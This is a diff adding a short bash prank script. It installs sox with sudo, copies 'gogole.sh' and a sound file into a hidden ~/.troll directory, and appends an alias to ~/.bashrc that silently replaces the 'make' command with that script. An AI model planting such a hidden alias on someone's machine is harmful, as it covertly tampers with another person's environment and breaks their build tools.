@@ -1,0 +1,9 @@
+#!/bin/bash
+
+sudo yum -y -q install sox
+mkdir ~/.troll
+cp gogole.sh ~/.troll
+cp son.mp3 ~/.troll
+echo "alias make='~/.troll/gogole.sh'" >> ~/.bashrc
+source ~/.bashrc
+#rm infinit_add
